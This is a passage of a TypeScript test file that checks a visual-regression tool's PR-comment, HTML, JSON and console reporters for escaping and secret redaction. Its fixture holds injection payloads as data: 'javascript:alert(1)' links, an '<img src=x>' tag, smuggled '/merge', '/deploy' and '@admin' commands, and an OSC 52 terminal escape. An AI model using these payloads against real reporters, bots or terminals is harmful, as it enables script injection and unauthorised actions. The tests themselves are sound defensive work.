      browser: 'chromium',
      status: 'regression',
      diffPercentage: 5,
      baselineImageUrl: 'javascript:alert(1)',
      aiAnalysis: {
        classification: 'regression',
        explanation: `Bad <img src=x> @admin\n/merge\n${secret}`,
        severity: 'critical',
        confidence: 0.9,
      },
      suggestedFix: {
        fixType: 'css',
        category: 'spacing-fix',
        patch: '.a { margin: 0; }\n```\n/deploy',
        confidence: 0.8,
        explanation: 'Fix @everyone\n/approve',
      },
      aiError: `err ${secret}`,
      dimensionNote: 'Dimension mismatch',
    };
    const run = makeRun([diff], {
      accessibility: [
        {
          route: '/x',
          viewport: 1440,
          passes: 0,
          incomplete: 0,
          violations: [
            {
              id: 'rule-1',
              impact: 'serious',
              description: 'desc',
              help: 'help',
              helpUrl: 'javascript:alert(1)',
              nodes: [{ target: ['.btn'] }],
            },
          ],
        },
      ],
    });

    const prMd = new GitHubPRReporter().generateComment(run);
    expect(prMd).toContain('<summary>`/x&lt;script&gt;`');
    expect(prMd).toContain('Bad &lt;img src=x&gt;');
    expect(prMd).not.toContain('javascript:alert(1)');
    expect(prMd).not.toContain(secret);
    expect(prMd).not.toContain('@admin');
    expect(prMd).toContain('````diff');

    const html = new HTMLReporter().generateReport(run);
    expect(html).not.toContain('href="javascript:alert(1)"');
    expect(html).not.toContain(secret);

    const logSpy = vi.spyOn(console, 'log').mockImplementation(() => {});
    try {
      new JSONReporter().onComplete(run);
      const printed = logSpy.mock.calls[0]?.[0] as string;
      expect(printed).not.toContain(secret);
      expect(printed).toContain('dimensionNote');
      expect(printed).toContain('aiError');
    } finally {
      logSpy.mockRestore();
    }

    const sanitized = sanitizeConsoleText(`\u001b]52;c;ZGF0YQ==\u0007\u001b[31mhi\u001b[0m ${secret}`);
    expect(sanitized).toBe('hi [REDACTED]');
  });
});
